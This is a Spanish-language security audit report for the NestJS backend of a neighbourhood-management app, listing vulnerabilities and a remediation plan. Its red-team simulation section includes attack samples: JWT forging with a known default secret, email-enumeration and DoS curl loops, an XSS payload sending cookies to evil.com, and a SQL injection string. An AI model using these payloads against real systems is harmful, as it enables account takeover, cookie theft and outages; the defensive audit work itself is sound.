# 🔐 Auditoría de Seguridad - VecinoSimple

> **Fecha de Auditoría:** 18 de Enero 2026  
> **Auditor:** Equipo de Seguridad (Red Team Simulation)  
> **Versión del Sistema:** 1.0.0  
> **Estado:** ⚠️ CRÍTICO - Requiere acción inmediata

---

## 📋 Resumen Ejecutivo

Se realizó una auditoría exhaustiva de seguridad del backend NestJS de VecinoSimple, simulando ataques de un equipo de hackers expertos (Red Team). La auditoría cubrió:

- **SQL Injection** ✅ Protegido (Prisma ORM)
- **XSS (Cross-Site Scripting)** ⚠️ Parcialmente protegido
- **Autenticación/JWT** 🔴 CRÍTICO - Vulnerabilidades encontradas
- **Autorización (RBAC)** ⚠️ Mejoras recomendadas
- **Rate Limiting** 🔴 CRÍTICO - Incompleto
- **CORS** ⚠️ Configuración insegura para producción
- **Secrets Management** 🔴 CRÍTICO - Hardcoded secrets
- **DDoS Protection** 🔴 No implementado
- **File Upload** ⚠️ Validación parcial
- **Logging/Monitoring** ⚠️ Información sensible expuesta

---

## 🔴 VULNERABILIDADES CRÍTICAS

### 1. JWT Secret Hardcodeado en Código

**Archivo:** `apps/api/src/modules/auth/auth.module.ts`

```typescript
// ❌ VULNERABLE
JwtModule.register({
  secret: process.env.NEXTAUTH_SECRET || "dev-secret-change-in-production",
  signOptions: { expiresIn: "1d" },
})
```

**Riesgo:** Si la variable de entorno no está configurada, usa un secret conocido públicamente.

**Impacto:** 
- Cualquier atacante puede forjar tokens JWT válidos
- Suplantación de identidad de cualquier usuario
- Acceso total al sistema como SUPER_ADMIN

**Severidad:** 🔴 CRÍTICA (CVSS 10.0)

---

### 2. JWT Token Sin Refresh Token Seguro

**Archivo:** `apps/api/src/modules/auth/auth.service.ts`

```typescript
// ❌ VULNERABLE - Token de 1 día sin refresh token rotativo
const accessToken = this.jwtService.sign({
  sub: usuario.id,
  email: usuario.email,
});
```

**Problemas:**
- Token de acceso con duración de 1 día (muy largo)
- No hay refresh token implementado
- No hay blacklist de tokens revocados
- No hay información del rol en el token

**Impacto:**
- Si un token es robado, el atacante tiene 24 horas de acceso
- No se puede revocar sesiones comprometidas
- Imposible forzar re-autenticación

**Severidad:** 🔴 CRÍTICA (CVSS 8.5)

---

### 3. Magic Link Token Sin Rate Limiting

**Archivo:** `apps/api/src/modules/auth/auth.service.ts`

```typescript
// ❌ VULNERABLE - Sin rate limiting en solicitud de magic link
async requestMagicLink(loginDto: LoginDto) {
  const { email } = loginDto;
  // ...genera y envía magic link sin límite
}
```

**Ataque posible:**
```bash
# Ataque de fuerza bruta para enumerar emails
for i in {1..10000}; do
  curl -X POST https://api.vecinosimple.com/auth/login \
    -d '{"email":"user'$i'@test.com"}'
done
```

**Impacto:**
- Enumeración de usuarios existentes
- Spam masivo de emails
- Agotamiento de recursos (DoS)

**Severidad:** 🔴 ALTA (CVSS 7.5)

---

### 4. Sin Rate Limiting Global

**Archivo:** `apps/api/src/main.ts`

```typescript
// ❌ FALTA - No hay ThrottlerModule configurado
async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  // ... sin rate limiting global
}
```

**Ataque posible:**
```bash
# Ataque DDoS simple
while true; do
  curl -X GET https://api.vecinosimple.com/api/v1/health &
done
```

**Impacto:**
- Denegación de servicio (DoS)
- Agotamiento de recursos del servidor
- Costos elevados en hosting

**Severidad:** 🔴 ALTA (CVSS 7.5)

---

### 5. CORS Abierto para Desarrollo

**Archivo:** `apps/api/src/main.ts`

```typescript
// ⚠️ INSEGURO para producción
app.enableCors({
  origin: [
    "http://localhost:3000",
    "http://localhost:3001",
    "http://localhost:3002",
  ],
  credentials: true,
});
```

**Problema:**
- En producción se necesita configurar los dominios reales
- Si se deja así, no hay protección CORS real
- Falta configuración para headers permitidos

**Severidad:** 🔴 ALTA (CVSS 6.5)

---

### 6. Magic Link Expuesto en Respuesta (Desarrollo)

**Archivo:** `apps/api/src/modules/auth/auth.service.ts`

```typescript
// ❌ PELIGROSO - Magic link en respuesta HTTP
return {
  success: true,
  message: `Magic link enviado a ${email}`,
  // En desarrollo, retornar el link (eliminar en producción)
  ...(process.env.NODE_ENV === "development" && { magicLink }),
};
```

**Problema:**
- Si `NODE_ENV` no está configurado correctamente, expone el token
- El token se logueará en consola en cualquier entorno

**Impacto:**
- Acceso no autorizado si logs son expuestos
- Bypass de autenticación

**Severidad:** 🟠 MEDIA-ALTA (CVSS 6.0)

---

## 🟠 VULNERABILIDADES MEDIAS

### 7. Sin Headers de Seguridad (Helmet)

**Archivo:** `apps/api/src/main.ts`

```typescript
// ❌ FALTA - No usa helmet para headers de seguridad
async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  // Falta: app.use(helmet());
}
```

**Headers faltantes:**
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `X-XSS-Protection: 1; mode=block`
- `Strict-Transport-Security`
- `Content-Security-Policy`

**Severidad:** 🟠 MEDIA (CVSS 5.0)

---

### 8. Información Sensible en Logs

**Archivo:** `apps/api/src/modules/auth/auth.service.ts`

```typescript
// ❌ PELIGROSO - Magic link completo en consola
console.log(`🔐 Magic Link para ${email}: ${magicLink}`);
```

**Archivos afectados:**
- auth.service.ts - magic link
- pagos.service.ts - datos de pago
- alertas.service.ts - datos de usuarios

**Impacto:**
- Si los logs son accesibles, se exponen credenciales
- Violación de privacidad (GDPR/Ley 25.326)

**Severidad:** 🟠 MEDIA (CVSS 5.5)

---

### 9. JWT Strategy Sin Validación Completa

**Archivo:** `apps/api/src/modules/auth/strategies/jwt.strategy.ts`

```typescript
// ❌ INCOMPLETO - No valida estado del usuario
async validate(payload: any) {
  return { sub: payload.sub, email: payload.email };
  // No verifica si el usuario sigue activo
  // No verifica si el usuario fue suspendido
  // No incluye rol para RBAC
}
```

**Impacto:**
- Usuarios suspendidos/eliminados mantienen acceso
- Tokens válidos incluso después de logout
- No hay información de rol en el contexto

**Severidad:** 🟠 MEDIA (CVSS 5.0)

---

### 10. Raw Query con Interpolación (Potencial SQL Injection)

**Archivo:** `apps/api/src/modules/consorcios/consorcios.service.ts`

```typescript
// ⚠️ REVISAR - Aunque Prisma sanitiza, es mejor evitar raw queries
this.prisma.$queryRaw<{ count: bigint }[]>`
  SELECT COUNT(DISTINCT uf.id) as count
  FROM unidades_funcionales uf
  LEFT JOIN movimientos_cuenta_corriente m ON m."unidadFuncionalId" = uf.id
  WHERE uf."consorcioId" = ${id}  // Interpolación de variable
  ...
`
```

**Nota:** Prisma usa template literals que SÍ sanitizan, pero las raw queries son riesgosas si se modifican incorrectamente.

**Severidad:** 🟡 BAJA (si se mantiene con Prisma template literals)

---

## 🟡 VULNERABILIDADES BAJAS / MEJORAS

### 11. Sanitización XSS Inconsistente

**Problema:** Cada servicio tiene su propia función `sanitizeText()` duplicada.

```typescript
// Se repite en ~10 archivos con ligeras variaciones
private sanitizeText(text: string): string {
  return text
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .trim();
}
```

**Mejora:** Centralizar en un servicio/util compartido.

---

### 12. Validación de URLs Hardcodeada

**Archivo:** `apps/api/src/modules/gastos/gastos.service.ts`

```typescript
// Lista de dominios hardcodeada
const dominiosPermitidos = [
  'storage.vecinosimple.com',
  'cdn.vecinosimple.com',
  'localhost',  // ❌ No debería estar en producción
];
```

**Mejora:** Mover a configuración de entorno.

---

### 13. Sin Validación de Complejidad de Contraseñas

Aunque se usa Magic Link, hay campos de contraseña en el schema que no tienen validación de complejidad si se implementa login tradicional.

---

## ✅ CONTROLES DE SEGURIDAD EXISTENTES

### Aspectos Positivos

1. **Prisma ORM:** Protección nativa contra SQL Injection
2. **ValidationPipe Global:** Validación de DTOs con class-validator
3. **Whitelist en ValidationPipe:** Rechaza propiedades no definidas
4. **Sanitización XSS:** Implementada en la mayoría de servicios
5. **Validación de URLs:** Previene SSRF básico
6. **Rate Limiting en Pagos:** 5 intentos por hora
7. **HMAC-SHA256 para Webhooks:** Validación de Mercado Pago
8. **AuditLog Inmutable:** Trazabilidad de operaciones
9. **Validación de Acceso por Consorcio:** Previene acceso cruzado
10. **Timing-Safe Comparison:** Para verificar firmas

---

## 🎯 SIMULACIÓN DE ATAQUES (Red Team)

### Ataque 1: Forjado de JWT

```bash
# Si se conoce el secret "dev-secret-change-in-production"
# Un atacante puede crear tokens válidos

import jwt
token = jwt.encode(
  {"sub": "admin-id", "email": "admin@vecinosimple.com"},
  "dev-secret-change-in-production",
  algorithm="HS256"
)
print(token)
# Este token sería válido si el secret no está configurado
```

**Resultado:** ⚠️ VULNERABLE si NODE_ENV no configura el secret

---

### Ataque 2: Enumeración de Usuarios

```bash
# Script para encontrar emails válidos
#!/bin/bash
for email in $(cat emails.txt); do
  response=$(curl -s -X POST https://api.vecinosimple.com/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\"}")
  
  if echo "$response" | grep -q "success"; then
    echo "FOUND: $email"
  fi
done
```

**Resultado:** ⚠️ VULNERABLE - Sin rate limiting

---

### Ataque 3: DDoS al Endpoint de Health

```bash
# Ataque DDoS simple
ab -n 100000 -c 1000 https://api.vecinosimple.com/api/v1/health
```

**Resultado:** 🔴 VULNERABLE - Sin protección DDoS

---

### Ataque 4: XSS Almacenado en Comunicados

```javascript
// Payload XSS que podría pasar si la sanitización falla
const payload = {
  titulo: "Aviso<script>document.location='https://evil.com/steal?c='+document.cookie</script>",
  contenido: "Contenido normal"
};
```

**Resultado:** ✅ PROTEGIDO por sanitización (verificado)

---

### Ataque 5: Bypass de RBAC

```typescript
// Intentar acceder a endpoint de admin sin permisos
fetch('/api/v1/usuarios', {
  headers: { Authorization: 'Bearer <token_de_vecino>' }
});
```

**Resultado:** ✅ PROTEGIDO por RolesGuard

---

### Ataque 6: SQL Injection via Prisma

```javascript
// Intento de SQL Injection
const payload = {
  email: "'; DROP TABLE usuarios; --"
};
```

**Resultado:** ✅ PROTEGIDO por Prisma ORM (prepared statements)

---

## 📊 Matriz de Riesgo

| Vulnerabilidad | Probabilidad | Impacto | Riesgo | Prioridad |
|----------------|--------------|---------|--------|-----------|
| JWT Secret Hardcodeado | Alta | Crítico | 🔴 CRÍTICO | P0 |
| Sin Rate Limiting Global | Alta | Alto | 🔴 ALTO | P0 |
| JWT Sin Refresh Token | Media | Alto | 🔴 ALTO | P1 |
| Magic Link Sin Rate Limit | Alta | Medio | 🟠 MEDIO | P1 |
| CORS Inseguro | Media | Alto | 🟠 MEDIO | P1 |
| Sin Helmet Headers | Alta | Medio | 🟠 MEDIO | P2 |
| Logs con Info Sensible | Media | Medio | 🟠 MEDIO | P2 |
| JWT Strategy Incompleta | Media | Medio | 🟠 MEDIO | P2 |
| Sanitización Duplicada | Baja | Bajo | 🟡 BAJO | P3 |

---

## 📅 Plan de Remediación

### Fase 1: Crítico (Inmediato - 24-48 horas)

1. [ ] Configurar JWT_SECRET seguro en producción
2. [ ] Implementar ThrottlerModule global
3. [ ] Configurar CORS para producción
4. [ ] Remover console.log de magic links

### Fase 2: Alto (1 semana)

1. [ ] Implementar refresh tokens
2. [ ] Rate limiting en /auth/login
3. [ ] Agregar helmet para headers de seguridad
4. [ ] Validar estado de usuario en JWT Strategy

### Fase 3: Medio (2 semanas)

1. [ ] Centralizar sanitización XSS
2. [ ] Mover dominios permitidos a config
3. [ ] Implementar blacklist de tokens
4. [ ] Configurar logging seguro (sin datos sensibles)

### Fase 4: Bajo (1 mes)

1. [ ] Tests de penetración automatizados
2. [ ] Monitoreo de seguridad (SIEM)
3. [ ] Programa de bug bounty
4. [ ] Auditoría de dependencias

---

## 📚 Referencias

- [OWASP Top 10](https://owasp.org/Top10/)
- [NestJS Security](https://docs.nestjs.com/security/helmet)
- [Prisma Security Best Practices](https://www.prisma.io/docs/concepts/components/prisma-client/raw-database-access)
- [JWT Best Practices](https://datatracker.ietf.org/doc/html/rfc8725)

---

**Siguiente paso:** Ver [SECURITY-REMEDIATION-PLAN.md](./SECURITY-REMEDIATION-PLAN.md) para el plan de acción detallado.
